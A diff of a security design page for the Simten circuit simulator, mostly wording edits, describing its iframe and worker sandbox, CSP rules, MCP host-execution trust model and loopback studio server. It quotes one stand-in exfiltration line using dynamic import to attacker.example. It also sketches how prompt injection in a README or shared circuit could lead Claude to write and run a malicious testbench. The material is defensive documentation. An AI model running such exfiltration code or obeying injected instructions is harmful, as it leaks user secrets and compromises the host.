@@ -5,7 +5,7 @@ description: How Simten isolates untrusted circuit code in both the browser and 
 
 ## Overview
 
-Circuit code is arbitrary TypeScript. When you share a circuit or ask Claude to simulate one, that code executes on your machine. Simten runs it in two separate sandboxes — one for the browser, one for the MCP server — so untrusted code cannot access your credentials, your filesystem, or your app's state.
+Circuit code is arbitrary TypeScript. When you share a circuit or ask Claude to simulate one, that code executes on your machine. Simten runs it in two separate sandboxes (one for the browser, one for the MCP server) so untrusted code cannot access your credentials, your filesystem, or your app's state.
 
 **Core invariant:** In: arbitrary TypeScript string. Out: plain JSON only. No functions, Maps, or class instances cross any boundary. Any dangerous code executes only inside the sandbox, and its results are serialised to safe primitives before leaving.
 
@@ -13,7 +13,7 @@ Circuit code is arbitrary TypeScript. When you share a circuit or ask Claude to 
 
 ## Browser Sandbox
 
-When you type circuit code in the editor, it compiles and simulates inside a hidden `<iframe>` served from a separate origin (`sandbox.simten.dev` in production, `localhost:3002` in development). The main app (`simten.dev` / `localhost:3001`) never executes user code directly — not even via `eval` or `new Function()`.
+When you type circuit code in the editor, it compiles and simulates inside a hidden `<iframe>` served from a separate origin (`sandbox.simten.dev` in production, `localhost:3002` in development). The main app (`simten.dev` / `localhost:3001`) never executes user code directly, not even via `eval` or `new Function()`.
 
 This applies to every code-execution surface: the editor, the live playground, and `<circuit-embed>` web components. All three route through the same sandbox.
 
@@ -21,7 +21,7 @@ This applies to every code-execution surface: the editor, the live playground, a
 
 **Origin isolation (iframe)**
 
-The iframe is served from a different origin. The browser enforces a hard boundary: code inside `sandbox.simten.dev` cannot read `simten.dev` cookies, `localStorage`, auth tokens, or DOM. This is enforced by the browser's same-origin policy at the OS level — not a JavaScript check.
+The iframe is served from a different origin. The browser enforces a hard boundary: code inside `sandbox.simten.dev` cannot read `simten.dev` cookies, `localStorage`, auth tokens, or DOM. This is enforced by the browser's same-origin policy at the OS level, not a JavaScript check.
 
 ```html
 <iframe
@@ -31,19 +31,19 @@ The iframe is served from a different origin. The browser enforces a hard bounda
 />
 ```
 
-`allow-same-origin` is required so the sandbox iframe can load its own scripts (Vite dev server, Cloudflare Pages). It does **not** weaken isolation: the escape hatch only applies when the iframe and parent share the same origin — they don't.
+`allow-same-origin` is required so the sandbox iframe can load its own scripts (Vite dev server, Cloudflare Pages). It does **not** weaken isolation: the escape hatch only applies when the iframe and parent share the same origin, and they don't.
 
 **Thread isolation (Web Worker)**
 
-The iframe spawns a Web Worker for all user code execution. Workers get their own OS thread. An infinite loop (`while(true){}`) blocks only the worker thread — the main app and iframe event loop remain fully responsive.
+The iframe spawns a Web Worker for all user code execution. Workers get their own OS thread. An infinite loop (`while(true){}`) blocks only the worker thread; the main app and iframe event loop remain fully responsive.
 
 ```
 simten.dev (main app)               ← never runs user code
-└── sandbox.simten.dev (iframe — origin boundary)
+└── sandbox.simten.dev (iframe, origin boundary)
     ├── iframe-main thread
     │   └── new Function(evalSource)  ← user lambdas (eval:/onTick:)
-    │       invoked from sim.tick(); not killable — see Known Limitation below
-    └── worker.ts (Web Worker — separate thread)
+    │       invoked from sim.tick(); not killable, see Known Limitation below
+    └── worker.ts (Web Worker, separate thread)
         └── new Function(userCode)    ← compile/simulate
             killable via worker.terminate() on 5s timeout
 ```
@@ -64,14 +64,14 @@ object-src  'none';
 
 The default of `'none'` means every directive must be explicitly opted in. The specific allowances below are the minimum needed for the sandbox to function:
 
-- `script-src 'self'` — the sandbox's own bundle, served same-origin.
-- `script-src 'unsafe-eval'` — `new Function()` is the mechanism that runs compiled user code.
-- `script-src blob:` — the worker loads npm packages via a generated blob-URL ES module.
-- `script-src https://esm.sh` — that blob module's static imports resolve to esm.sh. **Dynamic `import()` is governed by `script-src`, not `connect-src`**, which is why this directive matters: without it, a circuit could exfiltrate data via `import('https://attacker.example/?leak=' + secret)` even though `connect-src` looks restrictive.
-- `connect-src 'self' https://esm.sh` — `fetch`, `XMLHttpRequest`, `WebSocket`, and friends are restricted to the same two destinations.
-- `worker-src 'self'` — the Web Worker can only be constructed from a same-origin URL.
+- `script-src 'self'`: the sandbox's own bundle, served same-origin.
+- `script-src 'unsafe-eval'`: `new Function()` is the mechanism that runs compiled user code.
+- `script-src blob:`: the worker loads npm packages via a generated blob-URL ES module.
+- `script-src https://esm.sh`: that blob module's static imports resolve to esm.sh. **Dynamic `import()` is governed by `script-src`, not `connect-src`**, which is why this directive matters: without it, a circuit could exfiltrate data via `import('https://attacker.example/?leak=' + secret)` even though `connect-src` looks restrictive.
+- `connect-src 'self' https://esm.sh`: `fetch`, `XMLHttpRequest`, `WebSocket`, and friends are restricted to the same two destinations.
+- `worker-src 'self'`: the Web Worker can only be constructed from a same-origin URL.
 
-To close the `import()` exfiltration channel entirely, the worker also **rejects circuit code containing dynamic `import()` expressions at compile time** — the rewriter only handles static `import` statements, and leaving `import()` ungated even with the CSP above is unnecessary risk. Static imports remain fully supported; that covers every legitimate use case (importing fast-check, npm hash libraries as Tier-A oracles, etc.).
+To close the `import()` exfiltration channel entirely, the worker also **rejects circuit code containing dynamic `import()` expressions at compile time**: the rewriter only handles static `import` statements, and leaving `import()` ungated even with the CSP above is unnecessary risk. Static imports remain fully supported; that covers every legitimate use case (importing fast-check, npm hash libraries as Tier-A oracles, etc.).
 
 This CSP is set both in the dev server (`apps/sandbox/vite.config.ts`) and in production (`apps/sandbox/public/_headers`, served by Cloudflare).
 
@@ -89,23 +89,23 @@ The main app never hangs. The sandbox recovers transparently.
 
 The same engine runs in two places **inside the sandbox iframe**: an ephemeral instance in the **Web Worker** during `compile` and headless `simulate`, and a persistent instance on the **iframe's own main thread** that drives the live canvas (`tick`, `setNode`, `snapshot`, `restore`).
 
-**The parent app (`simten.dev`) never executes user code at all** — it lives behind the origin boundary. Everything below is about the split *inside* the sandbox iframe.
+**The parent app (`simten.dev`) never executes user code at all**; it lives behind the origin boundary. Everything below is about the split *inside* the sandbox iframe.
 
-The split between worker and iframe-main is not about one being safer than the other — they share origin and CSP. It's about **runaway recovery**. `worker.terminate()` is the only way out of a `while(true){}` in user code. If the canvas sim shared the worker thread, every bad loop would wipe switch positions, cycle count, and snapshots. Keeping the persistent sim on iframe-main makes a runaway in compile/simulate cost the user 5 seconds and an error toast, not their session.
+The split between worker and iframe-main is not about one being safer than the other; they share origin and CSP. It's about **runaway recovery**. `worker.terminate()` is the only way out of a `while(true){}` in user code. If the canvas sim shared the worker thread, every bad loop would wipe switch positions, cycle count, and snapshots. Keeping the persistent sim on iframe-main makes a runaway in compile/simulate cost the user 5 seconds and an error toast, not their session.
 
-This is structural crash isolation — it falls out of *where* code runs, not from careful error handling. The cost is one extra postMessage hop per tick, well under the frame budget.
+This is structural crash isolation: it falls out of *where* code runs, not from careful error handling. The cost is one extra postMessage hop per tick, well under the frame budget.
 
 ### Known limitation: `eval:` and `onTick:` lambdas
 
-Circuit components can attach user lambdas via `eval:` and `onTick:`. These are reconstructed via `new Function()` on the iframe's main thread (because the persistent sim that invokes them lives there) and called during `sim.tick()`. A pathological lambda — for instance `eval: () => { while(1); }` — can therefore hang the iframe's main thread, *outside* the worker terminate envelope that protects compile/simulate.
+Circuit components can attach user lambdas via `eval:` and `onTick:`. These are reconstructed via `new Function()` on the iframe's main thread (because the persistent sim that invokes them lives there) and called during `sim.tick()`. A pathological lambda (for instance `eval: () => { while(1); }`) can therefore hang the iframe's main thread, *outside* the worker terminate envelope that protects compile/simulate.
 
-The security boundary still holds: the origin boundary blocks access to `simten.dev` cookies/storage, the CSP blocks data egress, and the hung thread has no path to the parent app. The impact is the user's *own* iframe hanging until they refresh — a self-DoS, not a confidentiality or integrity breach. Same risk class as any website running an infinite loop on itself.
+The security boundary still holds: the origin boundary blocks access to `simten.dev` cookies/storage, the CSP blocks data egress, and the hung thread has no path to the parent app. The impact is the user's *own* iframe hanging until they refresh: a self-DoS, not a confidentiality or integrity breach. Same risk class as any website running an infinite loop on itself.
 
-Fully closing this would require moving the persistent sim into the worker so `terminate()` covers eval invocations too. The blocker is canvas-state recovery on terminate (snapshot-before-execute / restore-on-terminate) — tracked as issue #51. See `apps/sandbox/src/main.ts` header for the in-code note.
+Fully closing this would require moving the persistent sim into the worker so `terminate()` covers eval invocations too. The blocker is canvas-state recovery on terminate (snapshot-before-execute / restore-on-terminate), tracked as issue #51. See `apps/sandbox/src/main.ts` header for the in-code note.
 
 ### postMessage boundary
 
-All communication between the main app and the sandbox crosses a `postMessage` boundary using structured-clone-safe data. User lambdas (`eval:`, `onTick:`) cross as **source strings** (`fn.toString()`) and are reconstructed via `new Function()` on the sandbox side — closure variables don't survive the round-trip. The `compile` response returns plain IR (`Circuit[]`, `libraryCircuits`, `evalSources`); the main frame reconstructs the runtime circuit from those parts. The iframe-main hang consequence of this design is covered in the Known Limitation section above.
+All communication between the main app and the sandbox crosses a `postMessage` boundary using structured-clone-safe data. User lambdas (`eval:`, `onTick:`) cross as **source strings** (`fn.toString()`) and are reconstructed via `new Function()` on the sandbox side, so closure variables don't survive the round-trip. The `compile` response returns plain IR (`Circuit[]`, `libraryCircuits`, `evalSources`); the main frame reconstructs the runtime circuit from those parts. The iframe-main hang consequence of this design is covered in the Known Limitation section above.
 
 ### npm imports
 
@@ -124,7 +124,7 @@ When the worker detects import statements, it:
 3. Merges the resolved package values into the scope passed to the circuit executor
 4. Revokes the Blob URL immediately after loading
 
-`@simten/*` imports are silently skipped — those names are already in scope and don't require a network fetch.
+`@simten/*` imports are silently skipped, since those names are already in scope and don't require a network fetch.
 
 This all happens inside the sandbox worker. The main frame never touches the npm packages.
 
@@ -132,26 +132,26 @@ This all happens inside the sandbox worker. The main frame never touches the npm
 
 | Attack | Status |
 |--------|--------|
-| Access `simten.dev` cookies / localStorage | Blocked — origin isolation |
-| Access `simten.dev` DOM | Blocked — origin isolation |
-| `window` object from user code | Blocked — runs in Worker (no `window`) |
-| `localStorage` from user code | Worker code can't reach `localStorage` at all (not defined in Workers); iframe-main eval code sees `sandbox.simten.dev`'s storage, not `simten.dev`'s — origin boundary blocks the cross-origin read |
-| Infinite loop in compile / simulate (worker) | Blocked — Worker on separate OS thread, killed after 5s via `worker.terminate()` |
-| Infinite loop in an `eval:` / `onTick:` lambda (iframe-main) | **Not blocked** — hangs the user's own iframe until they refresh. Self-DoS only; no data egress (CSP holds), no parent-app reach (origin boundary holds). See Known Limitation above. |
-| HTTP requests to arbitrary hosts | Blocked — `connect-src` CSP on sandbox server |
-| Source code exfiltration via `fetch` | Blocked — `connect-src` CSP on sandbox server |
-| `new Function()` in main frame | Blocked — enforced by automated invariant tests (see below) |
+| Access `simten.dev` cookies / localStorage | Blocked: origin isolation |
+| Access `simten.dev` DOM | Blocked: origin isolation |
+| `window` object from user code | Blocked: runs in Worker (no `window`) |
+| `localStorage` from user code | Worker code can't reach `localStorage` at all (not defined in Workers); iframe-main eval code sees `sandbox.simten.dev`'s storage, not `simten.dev`'s; the origin boundary blocks the cross-origin read |
+| Infinite loop in compile / simulate (worker) | Blocked: Worker on separate OS thread, killed after 5s via `worker.terminate()` |
+| Infinite loop in an `eval:` / `onTick:` lambda (iframe-main) | **Not blocked**: hangs the user's own iframe until they refresh. Self-DoS only; no data egress (CSP holds), no parent-app reach (origin boundary holds). See Known Limitation above. |
+| HTTP requests to arbitrary hosts | Blocked: `connect-src` CSP on sandbox server |
+| Source code exfiltration via `fetch` | Blocked: `connect-src` CSP on sandbox server |
+| `new Function()` in main frame | Blocked: enforced by automated invariant tests (see below) |
 
 ---
 
 ## MCP Server: host execution, not a sandbox
 
-When Claude calls `verify_circuit`, `simulate_circuit`, or `check_circuit`, the code runs **on your host with your trust level** — not in an isolated sandbox.
+When Claude calls `verify_circuit`, `simulate_circuit`, or `check_circuit`, the code runs **on your host with your trust level**, not in an isolated sandbox.
 
 - `verify_circuit` spawns your testbench file (`*.verify.ts`) via `tsx` as a subprocess. It inherits your shell environment, has full filesystem access, and can reach the network. This is the same trust level as `npm test`.
 - `simulate_circuit` and `check_circuit` execute in-process inside the MCP server itself. No subprocess boundary.
 
-This is intentional. The MCP server runs alongside your IDE; the testbenches are part of your repo; both are code you wrote (or pasted) and chose to run. Adding a sandbox here would block legitimate use cases — Tier-A oracles that import npm packages, testbenches that read fixture files, captured-data verification — without adding meaningful protection. An attacker who can write to your repo can do worse than what a sandboxed testbench could.
+This is intentional. The MCP server runs alongside your IDE; the testbenches are part of your repo; both are code you wrote (or pasted) and chose to run. Adding a sandbox here would block legitimate use cases (Tier-A oracles that import npm packages, testbenches that read fixture files, captured-data verification) without adding meaningful protection. An attacker who can write to your repo can do worse than what a sandboxed testbench could.
 
 This is the same trust model used by `npm test`, `vitest`, IDE language servers, and most other MCP servers (filesystem, git, postgres, etc.). The norm for "developer tooling that runs your code on your behalf" is no sandbox.
 
@@ -160,24 +160,24 @@ This is the same trust model used by `npm test`, `vitest`, IDE language servers,
 | If you... | Then... |
 |---|---|
 | Write your own testbenches | Same trust as any code in your repo |
-| Paste a `.verify.ts` from a stranger | Treat it like pasting any other `.ts` file from a stranger — it can read your files, hit the network, run arbitrary code |
+| Paste a `.verify.ts` from a stranger | Treat it like pasting any other `.ts` file from a stranger: it can read your files, hit the network, run arbitrary code |
 | Run an MCP tool against a circuit shared by someone else | The *circuit* runs in the browser sandbox documented above. The *testbench* (if you wrote one) runs on your host. |
 
 ### Boundaries that still apply
 
 - **Browser-rendered circuits** continue to execute inside the browser sandbox above. The MCP host-execution model only governs `verify_circuit` and the MCP-side simulate/check entry points.
 - **Per-call timeouts.** Each MCP tool has a per-call timeout (default 30s for verify) so a hung testbench doesn't wedge the session. The subprocess is killed on timeout.
-- **The MCP server itself does not phone home.** No telemetry, no analytics — the network reach a testbench has comes from `tsx` inheriting your environment, not from MCP infrastructure.
+- **The MCP server itself does not phone home.** No telemetry, no analytics; the network reach a testbench has comes from `tsx` inheriting your environment, not from MCP infrastructure.
 
 ### The prompt-injection angle
 
-The one MCP-specific risk worth naming: with `npm test`, *you* invoke it. With MCP, Claude invokes `verify_circuit` on your behalf — and could in principle be socially engineered via prompt injection (a crafted instruction in a README, a circuit shared by another user) into writing a malicious `.verify.ts` and running it.
+The one MCP-specific risk worth naming: with `npm test`, *you* invoke it. With MCP, Claude invokes `verify_circuit` on your behalf, and could in principle be socially engineered via prompt injection (a crafted instruction in a README, a circuit shared by another user) into writing a malicious `.verify.ts` and running it.
 
-This isn't unique to simten — every code-executing MCP tool (filesystem-write + bash, language interpreters, etc.) has the same shape. Mitigation belongs in the layers above the tool: the MCP client confirming tool calls before they run (most do), and the LLM provider's prompt-injection defenses. Sandboxing `verify_circuit` alone wouldn't fix it: a malicious instruction could still drive *other* tools the agent has (Write, Bash) to compromise the host.
+This isn't unique to simten; every code-executing MCP tool (filesystem-write + bash, language interpreters, etc.) has the same shape. Mitigation belongs in the layers above the tool: the MCP client confirming tool calls before they run (most do), and the LLM provider's prompt-injection defenses. Sandboxing `verify_circuit` alone wouldn't fix it: a malicious instruction could still drive *other* tools the agent has (Write, Bash) to compromise the host.
 
 ### If you want stronger isolation
 
-The model above is the default and matches what `npm test` does. If your threat model requires stronger isolation — for example, you're running untrusted testbenches from public sources — the MCP server runs anywhere Node runs. Invoke it inside a Docker container, on a separate user account, or on an isolated dev VM. The tool imposes no sandbox; the OS-level choice is yours.
+The model above is the default and matches what `npm test` does. If your threat model requires stronger isolation (for example, you're running untrusted testbenches from public sources), the MCP server runs anywhere Node runs. Invoke it inside a Docker container, on a separate user account, or on an isolated dev VM. The tool imposes no sandbox; the OS-level choice is yours.
 
 ---
 
@@ -187,12 +187,12 @@ Separate from the host-execution model above (which governs running *your* code)
 
 Because that server is browser-facing, its security rests on four properties:
 
-- **Loopback-only bind.** The HTTP + WebSocket server binds `127.0.0.1`, so it is not reachable from your network or LAN — only processes on your own machine can connect.
+- **Loopback-only bind.** The HTTP + WebSocket server binds `127.0.0.1`, so it is not reachable from your network or LAN; only processes on your own machine can connect.
 - **Per-process token.** Each MCP start mints a fresh random token, delivered to the viewer only via the URL fragment (which the browser never sends to the server in a request, and which is never embedded in served content). A connection whose token doesn't match is closed immediately. The token is not persisted to disk, so a stale tab can't authenticate against a later instance.
-- **Origin allowlist.** A browser WebSocket handshake whose `Origin` isn't `localhost` is refused before the token is even checked — so a cross-site page you happen to visit cannot open a studio socket even if it guesses the port. Non-browser clients (which send no `Origin`) remain token-gated.
+- **Origin allowlist.** A browser WebSocket handshake whose `Origin` isn't `localhost` is refused before the token is even checked, so a cross-site page you happen to visit cannot open a studio socket even if it guesses the port. Non-browser clients (which send no `Origin`) remain token-gated.
 - **Viewer-only inbound surface.** The server accepts exactly two messages from the browser: a session `register`, and a `render-result` that is reduced to a **boolean acknowledgment**. Browser-supplied strings (circuit names, error text) are discarded and never surfaced to a tool result, an MCP notification, or anything an agent reads. The circuit name shown to Claude is derived from the source the *MCP* pushed, not from the browser. This is why the older browser→Claude chat bridge and the `get_circuit_state` read-back were removed: a rendered, possibly-hostile page must not be able to feed a shell-capable agent or read host state.
 
-The served content is just the public editor bundle (no secrets); path requests are traversal-guarded and contained to the bundle directory. The only sensitive data — your circuit source — travels over the token-gated WebSocket, never the static file server. Circuit code rendered in that viewer still executes inside the [browser sandbox](#browser-sandbox), exactly as on the hosted site.
+The served content is just the public editor bundle (no secrets); path requests are traversal-guarded and contained to the bundle directory. The only sensitive data, your circuit source, travels over the token-gated WebSocket, never the static file server. Circuit code rendered in that viewer still executes inside the [browser sandbox](#browser-sandbox), exactly as on the hosted site.
 
 ---
 
@@ -200,7 +200,7 @@ The served content is just the public editor bundle (no secrets); path requests 
 
 To prevent accidental re-introduction of unsafe code execution patterns in the main frame, the test suite includes invariant checks that scan all source files in `apps/web/src` and `packages/embed/src`:
 
-- No `new Function(` calls — the underlying primitive behind all dynamic code execution
-- No imports of `executeCircuitCode` or `executeJsCode` — the core functions that call `new Function()`
+- No `new Function(` calls: the underlying primitive behind all dynamic code execution
+- No imports of `executeCircuitCode` or `executeJsCode`: the core functions that call `new Function()`
 
 These tests run in CI and fail immediately if either pattern appears outside the sandbox worker.
